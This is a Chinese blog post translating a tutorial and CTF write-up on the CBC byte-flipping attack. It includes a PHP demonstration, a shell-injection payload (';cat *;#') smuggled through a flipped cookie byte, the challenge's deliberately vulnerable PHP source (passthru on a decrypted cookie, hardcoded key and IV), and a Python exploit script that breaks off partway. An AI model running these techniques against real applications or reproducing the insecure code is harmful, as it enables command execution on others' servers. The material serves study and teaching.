<!DOCTYPE html>
<html lang="en">
<head>
    <title>CBC字节翻转攻击-101Approach</title>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="blog, accent, Larryxi, Larryxi's blog, jekyll">
    <meta name="author" content="Larryxi">
    
    
        
    
    
        
    
    <meta name="description" content="Larryxi's blog,learn security everyday.
">
    <link href='/css/font.css' rel='stylesheet' type='text/css'>
    <link rel="alternate" type="application/rss+xml" title="Larryxi's blog RSS" href="/feed.xml" />
    <link rel="stylesheet" href="/css/main.css">
    
        <link rel="icon" type="image/ico" href="/images/favicon.ico">
        <link rel="shortcut-icon" type="image/ico" href="/images/favicon.ico">
    
    
    <!-- Facebook Open Graph -->
    <meta name="og:description" content="Larryxi's blog,learn security everyday.
">
    <meta name="og:title" content="Larryxi's blog">
    <meta name="og:url" content="https://larryxi.github.io/cbc-byte-flipping-attack-101-approach-studying.html">
    <meta name="og:type" content="article">
    
    
    <!-- Twitter -->
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="Larryxi's blog">
    <meta name="twitter:description" content="Larryxi's blog,learn security everyday.
">
    <meta name="twitter:url" content="https://larryxi.github.io/cbc-byte-flipping-attack-101-approach-studying.html">
    
        <meta name="twitter:image" content="images/lubang.jpg">
    
</head>
<body>
    <div class="wrapper">
        <div class="main">
            <nav class="navbar">
                <a href="/">
                    <span class="alignable pull-left back-outer">
                        <span class="alignable pull-left back-inner">
                        </span>
                    </span>
                </a>
            </nav>
            <div class="content container">
    <div class="post-date">
        <time>August 09, 2015 </time>
    </div>
    <h1 class="post-title">CBC字节翻转攻击-101Approach</h1>
    <h1 id="x00-">0x00 译者前言</h1>

<hr />

<p>本文翻译自：<a href="http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/">http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/</a><br />
drops里的相关主题文章：<a href="http://drops.wooyun.org/tips/4975">使用CBC比特反转攻击绕过加密的会话令牌</a><br />
缘起是糖果出的一道题，看到原文作者对这一问题阐述的较为详细，虽然时间有些久远，但翻译一下可与诸君学习一下思考问题的方法。</p>

<h1 id="x01-">0x01 相关介绍</h1>

<hr />

<p>此攻击方法的精髓在于：<strong>通过损坏密文字节来改变明文字节</strong>。（注：借助CBC内部的模式）借由此可以绕过过滤器，或者改变用户权限提升至管理员，又或者改变应用程序预期明文以尽猥琐之事。</p>

<p>首先让我们看看CBC是如何工作的，（作者很懒所以）更多细节你可以看这里：<a href="http://en.wikipedia.org/wiki/Block_cipher_mode_of_operation">wiki</a></p>

<p>在这里只是解释一下关于攻击必须要理解的部分。（即：一图胜千言）</p>

<p><strong>加密过程</strong>
<img src="/images/20150808/Encryption.png" alt="Encryption" />
<strong>Plaintext</strong>：待加密的数据。
<strong>IV</strong>：用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。
<strong>Key</strong>：被一些如AES的对称加密算法使用。
<strong>Ciphertext</strong>：加密后的数据。</p>

<p>在这里重要的一点是，CBC工作于一个固定长度的比特组，将其称之为<em>块</em>。在本文中，我们将使用包含16字节的块。</p>

<p>因为作者讨厌高数（和译者一样），所以作者造了一些自己的公式（方便记忆）：</p>

<ul>
  <li><em>Ciphertext-0 = Encrypt(Plaintext XOR IV)</em>—只用于第一个组块</li>
  <li><em>Ciphertext-N= Encrypt(Plaintext XOR Ciphertext-N-1)</em>—用于第二及剩下的组块</li>
</ul>

<p>注意：正如你所见，<strong>前一块的密文用来产生后一块的密文</strong>。</p>

<p><strong>Decryption Process</strong>
<img src="/images/20150808/Decryption.png" alt="Decryption" /></p>

<ul>
  <li><em>Plaintext-0 = Decrypt(Ciphertext) XOR IV</em>—只用于第一个组块</li>
  <li><em>Plaintext-N= Decrypt(Ciphertext) XOR Ciphertext-N-1</em>—用于第二及剩下的组块</li>
</ul>

<p>注意：<strong><em>Ciphertext-N-1</em>（密文-N-1）是用来产生下一块明文</strong>；这就是字节翻转攻击开始发挥作用的地方。如果我们改变<em>Ciphertext-N-1</em>（密文-N-1）的一个字节，然后与下一个解密后的组块异或，我们就可以得到一个不同的明文了！<strong>You got it?</strong>别担心，下面我们将看到一个详细的例子。与此同时，下面的这张图也可以很好地说明这种攻击：
<img src="/images/20150808/attack.jpg" alt="attack" /></p>

<h2 id="x02-cbc-blocks-of-16-bytes">0x02 一个例子（CBC Blocks of 16 bytes）</h2>

<p>比方说，我们有这样的明文序列：</p>

<p><code>a:2:{s:4:"name";s:6:"sdsdsd";s:8:"greeting";s:20:"echo 'Hello sdsdsd!'";}</code></p>

<p>我们的目标是将“<code>s:6</code>”当中的数字6转换成数字“7”。我们需要做的第一件事就是把明文分成16个字节的块：</p>

<ul>
  <li>Block 1:<code>a:2:{s:4:"name";</code></li>
  <li>Block 2:<code>s:6:"sdsdsd";s:8</code></li>
  <li>Block 3:<code>:"greeting";s:20</code></li>
  <li>Block 4:<code>:"echo 'Hello sd</code></li>
  <li>Block 5:<code>sdsd!'";}</code></li>
</ul>

<p>因此，我们的目标字符位于块2，这意味着我们需要改变块1的密文来改变第二块的明文。</p>

<p>有一条经验法则是（注：结合上面的说明图可以得到），你在密文中改变的字节，<strong>只</strong>会影响到在下一明文当中，具有相同偏移量的字节。所以我们目标的偏移量是2：</p>

<ul>
  <li>[0] = s</li>
  <li>[1] = :</li>
  <li>[2] =6</li>
</ul>

<p>因此我们要改变在第一个密文块当中，偏移量是2的字节。正如你在下面的代码当中看到的，在第2行我们得到了整个数据的密文，然后在第3行中，我们改变块1中偏移量为2的字节，最后我们再调用解密函数。</p>

<ol>
  <li><code>$v = "a:2:{s:4:"name";s:6:"sdsdsd";s:8:"greeting";s:20:"echo 'Hello sdsdsd!'";}";</code></li>
  <li><code>$enc = @encrypt($v);</code></li>
  <li><code>$enc[2] = chr(ord($enc[2]) ^ ord("6") ^ ord ("7"));</code></li>
  <li><code>$b = @decrypt($enc);</code></li>
</ol>

<p>运行这段代码后，我们可以将数字6变为7：
<img src="/images/20150808/pic1.png" alt="pic1" /></p>

<p>但是我们在第3行中，是如何改变字节成为我们想要的值呢？</p>

<p>基于上述的解密过程，我们知道有，<em>A = Decrypt(Ciphertext)</em>与<em>B = Ciphertext-N-1</em>异或后最终得到<em>C = 6</em>。等价于：</p>

<pre><code>C = A XOR B
</code></pre>

<p>所以，我们唯一不知道的值就是A（注：对于B，C来说）（<em>block cipher decryption</em>）;借由XOR，我们可以很轻易地得到A的值：</p>

<pre><code>A = B XOR C
</code></pre>

<p>最后，A XOR B XOR C等于0。有了这个公式，我们可以在XOR运算的末尾处设置我们自己的值，就像这样：</p>

<p><code>A XOR B XOR C XOR "7" </code>会在块2的明文当中，偏移量为2的字节处得到7。</p>

<p>下面是相关原理实现的PHP源代码：</p>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;MY_AES_KEY&#39;</span><span class="p">,</span> <span class="s2">&quot;abcdef0123456789&quot;</span><span class="p">);</span>
<span class="k">function</span> <span class="nf">aes</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$encrypt</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$aes</span> <span class="o">=</span> <span class="nb">mcrypt_module_open</span><span class="p">(</span><span class="nx">MCRYPT_RIJNDAEL_128</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nx">MCRYPT_MODE_CBC</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
    <span class="nv">$iv</span> <span class="o">=</span> <span class="s2">&quot;1234567891234567&quot;</span><span class="p">;</span>
    <span class="nb">mcrypt_generic_init</span><span class="p">(</span><span class="nv">$aes</span><span class="p">,</span> <span class="nx">MY_AES_KEY</span><span class="p">,</span> <span class="nv">$iv</span><span class="p">);</span>
    <span class="k">return</span> <span class="nv">$encrypt</span> <span class="o">?</span> <span class="nb">mcrypt_generic</span><span class="p">(</span><span class="nv">$aes</span><span class="p">,</span><span class="nv">$data</span><span class="p">)</span> <span class="o">:</span> <span class="nb">mdecrypt_generic</span><span class="p">(</span><span class="nv">$aes</span><span class="p">,</span><span class="nv">$data</span><span class="p">);</span>
<span class="p">}</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;MY_MAC_LEN&#39;</span><span class="p">,</span> <span class="mi">40</span><span class="p">);</span>
<span class="k">function</span> <span class="nf">encrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">aes</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">decrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">rtrim</span><span class="p">(</span><span class="nx">aes</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="k">false</span><span class="p">),</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">);</span>
    <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
<span class="p">}</span>
<span class="nv">$v</span> <span class="o">=</span> <span class="s2">&quot;a:2:{s:4:</span><span class="se">\&quot;</span><span class="s2">name</span><span class="se">\&quot;</span><span class="s2">;s:6:</span><span class="se">\&quot;</span><span class="s2">sdsdsd</span><span class="se">\&quot;</span><span class="s2">;s:8:</span><span class="se">\&quot;</span><span class="s2">greeting</span><span class="se">\&quot;</span><span class="s2">;s:20:</span><span class="se">\&quot;</span><span class="s2">echo &#39;Hello sdsdsd!&#39;</span><span class="se">\&quot;</span><span class="s2">;}&quot;</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">&quot;Plaintext before attack: </span><span class="si">$v\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="nv">$b</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="nv">$enc</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="nv">$enc</span> <span class="o">=</span> <span class="o">@</span><span class="nx">encrypt</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
<span class="nv">$enc</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span>  <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$enc</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="s2">&quot;6&quot;</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span> <span class="p">(</span><span class="s2">&quot;7&quot;</span><span class="p">));</span>
<span class="nv">$b</span> <span class="o">=</span> <span class="o">@</span><span class="nx">decrypt</span><span class="p">(</span><span class="nv">$enc</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">&quot;Plaintext AFTER attack : </span><span class="si">$b\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="x"></span></code></pre></div>

<h1 id="x03-">0x03 一个练习</h1>

<hr />

<p>光说不练假把式，接下来作者举了一个他参加过的CTF中的一道题目的例子（更多详情可以参阅最后的相关参考链接），然后阐述了他是怎样在最后几步中打破CBC的。</p>

<p>下面提供了这个练习当中很重要的一部分源码：
<img src="/images/20150808/pic2.png" alt="pic2" /></p>

<p>其中，你在POST提交参数”name”的任何文本值之后，应用程序则会对应输出”Hello”加上最后提交的文本。但是有两件事情发生在消息打印之前：</p>

<ol>
  <li>POST参数”name”值被PHP函数escapeshellarg()过滤（转换单引号，防止恶意命令注入），然后将其存储在Array-&gt;greeting当中，最后加密该值来产生cookie。</li>
  <li>Array-&gt;greeting当中的内容被PHP函数passthru()执行。</li>
  <li>最后，在页面被访问的任何时间中，如果cookie已经存在，它会被解密，它的内容会通过passthru()函数执行。如前节所述，在这里CBC攻击会给我们一个不同的明文。</li>
</ol>

<p>然后作者构造了一个POST”name”的值来注入字符串：</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">name</span> <span class="o">=</span> <span class="s">&#39;X&#39;</span> <span class="o">+</span> <span class="s">&#39;;cat *;#a&#39;</span></code></pre></div>

<p>首先作者添加了一个字符”X”，通过CBC翻转攻击将其替换成一个单引号，然后<code>;cat *;</code>命令将被执行，最后的<code>#</code>是用来注释，确保函数escapeshellarg()插入的单引号不会引起其他问题；因此我们的命令就被成功执行啦。</p>

<p>在计算好之前的密码块中，要被改变的字节的确切偏移量（51）后，作者通过下面的代码来注入单引号：</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">pos</span> <span class="o">=</span> <span class="mi">51</span><span class="p">;</span>
<span class="n">val</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s">&#39;X&#39;</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="s">&quot;&#39;&quot;</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">cookie</span><span class="p">[</span><span class="n">pos</span><span class="p">]))</span>
<span class="n">exploit</span> <span class="o">=</span> <span class="n">cookie</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">pos</span><span class="p">]</span> <span class="o">+</span> <span class="n">val</span> <span class="o">+</span> <span class="n">cookie</span><span class="p">[</span><span class="n">pos</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:]</span></code></pre></div>

<p>然后作者通过改变cookie（因为其具有全部的密文），得到以下结果：
<img src="/images/20150808/pic3.png" alt="pic3" /></p>

<p>首先，因为我们改变了第一块，所以在第二块中，黄色标记的”X”被成功替换为单引号，它被认为是多余插入（绿色），导致在unserialize()处理数据时产生一个错误（红色），因此应用程序甚至都没有去尝试执行注入了。</p>

<p><strong>如何完善</strong></p>

<p>我们需要使我们的注入数据有效，那么我们在第一块中得到的额外数据，就不能在反序列化的过程中造成任何问题（unserialize()）。一种方法是在我们的恶意命令中填充字母字符。因此我们尝试在注入字符串前后填充多个’z’：</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">name</span> <span class="o">=</span> <span class="s">&#39;z&#39;</span><span class="o">*</span><span class="mi">17</span> <span class="o">+</span> <span class="s">&#39;X&#39;</span> <span class="o">+</span> <span class="s">&#39;;cat *;#&#39;</span> <span class="o">+</span> <span class="s">&#39;z&#39;</span><span class="o">*</span><span class="mi">16</span></code></pre></div>

<p>在发送上述字符串后，unserialize()并没有报错，并且我们的shell命令成功执行！！！</p>

<h1 id="x04-">0x04 相关参考</h1>

<hr />

<ol>
  <li>CRYPTO #2: http://blog.gdssecurity.com/labs/tag/crypto</li>
  <li>http://codezen.fr/2013/08/05/ebctf-2013-web400-cryptoaescbchmac-write-up/</li>
  <li>http://hardc0de.ru/2013/08/04/ebctf-web400/</li>
</ol>

<h1 id="x05-">0x05 附录代码</h1>

<hr />

<p>下面是上面练习当中的PHP源码及exp：</p>

<ul>
  <li>PHP code:</li>
</ul>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>     
<span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;display_errors&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
<span class="nb">error_reporting</span><span class="p">(</span><span class="k">E_ALL</span><span class="p">);</span>
 
<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;MY_AES_KEY&#39;</span><span class="p">,</span> <span class="s2">&quot;abcdef0123456789&quot;</span><span class="p">);</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;MY_HMAC_KEY&#39;</span><span class="p">,</span><span class="s2">&quot;1234567890123456&quot;</span> <span class="p">);</span>
<span class="c1">#define(&quot;FLAG&quot;,&quot;CENSORED&quot;);</span>
 
<span class="k">function</span> <span class="nf">aes</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$encrypt</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$aes</span> <span class="o">=</span> <span class="nb">mcrypt_module_open</span><span class="p">(</span><span class="nx">MCRYPT_RIJNDAEL_128</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nx">MCRYPT_MODE_CBC</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
    <span class="nv">$iv</span> <span class="o">=</span> <span class="nb">mcrypt_create_iv</span> <span class="p">(</span><span class="nb">mcrypt_enc_get_iv_size</span><span class="p">(</span><span class="nv">$aes</span><span class="p">),</span> <span class="nx">MCRYPT_RAND</span><span class="p">);</span>
    <span class="nv">$iv</span> <span class="o">=</span> <span class="s2">&quot;1234567891234567&quot;</span><span class="p">;</span>
    <span class="nb">mcrypt_generic_init</span><span class="p">(</span><span class="nv">$aes</span><span class="p">,</span> <span class="nx">MY_AES_KEY</span><span class="p">,</span> <span class="nv">$iv</span><span class="p">);</span>
    <span class="k">return</span> <span class="nv">$encrypt</span> <span class="o">?</span> <span class="nb">mcrypt_generic</span><span class="p">(</span><span class="nv">$aes</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span> <span class="o">:</span> <span class="nb">mdecrypt_generic</span><span class="p">(</span><span class="nv">$aes</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
<span class="p">}</span>
 
<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;MY_MAC_LEN&#39;</span><span class="p">,</span> <span class="mi">40</span><span class="p">);</span>
 
<span class="k">function</span> <span class="nf">hmac</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nb">hash_hmac</span><span class="p">(</span><span class="s1">&#39;sha1&#39;</span><span class="p">,</span> <span class="nx">data</span><span class="p">,</span> <span class="nx">MY_HMAC_KEY</span><span class="p">);</span>
<span class="p">}</span>
 
<span class="k">function</span> <span class="nf">encrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">aes</span><span class="p">(</span><span class="nv">$data</span> <span class="o">.</span> <span class="nx">hmac</span><span class="p">(</span><span class="nv">$data</span><span class="p">),</span> <span class="k">true</span><span class="p">);</span>
<span class="p">}</span>
 
<span class="k">function</span> <span class="nf">decrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">rtrim</span><span class="p">(</span><span class="nx">aes</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="k">false</span><span class="p">),</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">);</span>
    <span class="nv">$mac</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="o">-</span><span class="nx">MY_MAC_LEN</span><span class="p">);</span>
    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="nx">MY_MAC_LEN</span><span class="p">);</span>
    <span class="k">return</span> <span class="nx">hmac</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="o">===</span> <span class="nv">$mac</span> <span class="o">?</span> <span class="nv">$data</span> <span class="o">:</span> <span class="k">null</span><span class="p">;</span>
<span class="p">}</span>
<span class="nv">$settings</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;settings&#39;</span><span class="p">])</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="o">@</span><span class="nx">decrypt</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;settings&#39;</span><span class="p">]));</span>
        <span class="nv">$settings</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="o">@</span><span class="nx">decrypt</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;settings&#39;</span><span class="p">])));</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nb">is_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="o">&lt;</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$settings</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
            <span class="s1">&#39;name&#39;</span> <span class="o">=&gt;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">],</span>
            <span class="s1">&#39;greeting&#39;</span> <span class="o">=&gt;</span> <span class="p">(</span><span class="s1">&#39;echo &#39;</span> <span class="o">.</span> <span class="nb">escapeshellarg</span><span class="p">(</span><span class="s2">&quot;Hello </span><span class="si">{</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">!&quot;</span><span class="p">)),</span>
    <span class="p">);</span>
    <span class="nb">setcookie</span><span class="p">(</span><span class="s1">&#39;settings&#39;</span><span class="p">,</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="o">@</span><span class="nx">encrypt</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$settings</span><span class="p">))));</span>
    <span class="c1">#setcookie(&#39;settings&#39;, serialize($settings));</span>
<span class="p">}</span>
<span class="nv">$d</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$settings</span><span class="p">[</span><span class="s1">&#39;greeting&#39;</span><span class="p">])</span> <span class="p">{</span>
    <span class="nb">passthru</span><span class="p">(</span><span class="nv">$settings</span><span class="p">[</span><span class="s1">&#39;greeting&#39;</span><span class="p">]);</span>
<span class="k">else</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">&quot;&lt;/pre&gt;</span>
<span class="s2">&lt;form action=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">?</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; method=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">POST\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot;&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
 <span class="k">echo</span> <span class="s2">&quot;</span>
<span class="s2">What is your name?</span>
<span class="s2"> </span>
<span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
 <span class="k">echo</span> <span class="s2">&quot;&lt;input type=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">text\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; name=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">name\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; /&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
 <span class="k">echo</span> <span class="s2">&quot;&lt;input type=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">submit\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; name=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">submit\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; value=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">Submit\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; /&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
 <span class="k">echo</span> <span class="s2">&quot;&lt;/form&gt;</span>
<span class="s2">&lt;pre&gt;</span>
<span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span></code></pre></div>

<ul>
  <li>Exploit:</li>
</ul>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">urllib</span>
<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span> <span class="k">as</span> <span class="n">dec</span>
<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span> <span class="k">as</span> <span class="n">enc</span>
 
<span class="n">url</span> <span class="o">=</span> <span class="s">&#39;http://192.168.184.133/ebctf/mine.php&#39;</span>
 
<span class="k">def</span> <span class="nf">Test</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
    <span class="n">t</span> <span class="o">=</span> <span class="s">&quot;echo &#39;Hello </span><span class="si">%s</span><span class="s">!&#39;&quot;</span> <span class="o">%</span> <span class="n">x</span>
    <span class="n">s</span> <span class="o">=</span> <span class="s">&#39;a:2:{s:4:&quot;name&quot;;s:</span><span class="si">%s</span><span class="s">:&quot;</span><span class="si">%s</span><span class="s">&quot;;s:8:&quot;greeting&quot;;s:</span><span class="si">%s</span><span class="s">:&quot;</span><span class="si">%s</span><span class="s">&quot;;}</span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">),</span><span class="n">x</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">t</span><span class="p">),</span><span class="n">t</span><span class="p">,</span> <span class="s">&#39;X&#39;</span><span class="o">*</span><span class="mi">40</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">),</span><span class="mi">16</span><span class="p">):</span>
        <span class="k">print</span> <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">16</span><span class="p">]</span>
    <span class="k">print</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span>
 
<span class="k">def</span> <span class="nf">Pwn</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">url</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">quote_plus</span><span class="p">(</span><span class="n">enc</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
    <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;settings&#39;</span> <span class="p">:</span> <span class="n">s</span><span class="p">})</span><span class="o">.</span><span class="n">content</span>
 <span class="c">#   if req.find(&#39;works&#39;) != -1:</span>
    <span class="k">print</span> <span class="n">req</span>
  <span class="c">#  else:</span>
   <span class="c">#     print &#39;[-] FAIL&#39;</span>
 
<span class="k">def</span> <span class="nf">GetCookie</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">url</span>
    <span class="n">d</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">&#39;name&#39;</span><span class="p">:</span><span class="n">name</span><span class="p">,</span>
        <span class="s">&#39;submit&#39;</span><span class="p">:</span><span class="s">&#39;Submit&#39;</span>
    <span class="p">}</span>
    <span class="n">h</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">d</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;Content-Type&#39;</span> <span class="p">:</span> <span class="s">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">})</span><span class="o">.</span><span class="n">headers</span>
    <span class="k">if</span> <span class="n">h</span><span class="o">.</span><span class="n">has_key</span><span class="p">(</span><span class="s">&#39;set-cookie&#39;</span><span class="p">):</span>
        <span class="n">h</span> <span class="o">=</span> <span class="n">dec</span><span class="p">(</span><span class="n">urllib</span><span class="o">.</span><span class="n">unquote_plus</span><span class="p">(</span><span class="n">h</span><span class="p">[</span><span class="s">&#39;set-cookie&#39;</span><span class="p">][</span><span class="mi">9</span><span class="p">:]))</span>
        <span class="c">#h = urllib.unquote_plus(h[&#39;set-cookie&#39;][9:])</span>
        <span class="c">#print h</span>
        <span class="k">return</span> <span class="n">h</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">&#39;[-] ERROR&#39;</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
 
